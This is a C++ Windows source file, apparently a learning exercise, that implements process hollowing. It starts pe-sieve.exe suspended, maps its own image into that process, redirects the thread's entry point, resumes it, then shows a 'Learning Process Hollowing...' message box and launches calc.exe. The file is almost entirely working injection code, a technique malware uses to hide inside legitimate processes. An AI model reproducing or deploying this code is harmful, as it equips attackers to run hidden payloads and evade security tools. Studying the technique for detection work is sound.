#include <stdio.h>
#include <iostream>
#include <windows.h>

BYTE* MapFileToMemory(LPCSTR filename, LONGLONG &filelen)
{
	FILE *fileptr;
	BYTE *buffer;

	fileptr = fopen(filename, "rb");  
	fseek(fileptr, 0, SEEK_END);          
	filelen = ftell(fileptr);            
	rewind(fileptr);                      
	buffer = (BYTE *)malloc((filelen + 1) * sizeof(char)); 
	fread(buffer, filelen, 1, fileptr); 
	fclose(fileptr); 
	return buffer;
}


void RunPortableExecutable(const char *path, void* Image) {
	PROCESS_INFORMATION PI = {};
	STARTUPINFOA SI = {};
	CONTEXT* CTX;

	void* pImageBase;
	IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS((size_t)Image + PIMAGE_DOS_HEADER(Image)->e_lfanew);
	IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER((size_t)NtHeader + sizeof(*NtHeader));

	if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI)) 
	{
		CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
		CTX->ContextFlags = CONTEXT_FULL;

		if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) 
		{
			pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
				NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

			WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
			for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
				WriteProcessMemory
				(
					PI.hProcess, 
					LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
					LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
					SectionHeader[i].SizeOfRawData, 
					0
				);

			WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImageBase), 4, 0);
			CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
			SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
			ResumeThread(PI.hThread);
		}
	}
}


int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

	char CurrentFilePath[MAX_PATH + 1];
	GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
	
	if (strstr(CurrentFilePath, "pe-sieve.exe")) {
		MessageBoxA(0, "Learning Process Hollowing...", "Cindy Wang", 0);
		return 0;
	}

	LONGLONG len = -1;
	RunPortableExecutable("pe-sieve.exe", MapFileToMemory(CurrentFilePath, len));
	MessageBoxA(0, "Learning Process Hollowing...", "Cindy Wang", 0);
	ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
	return 0;
}
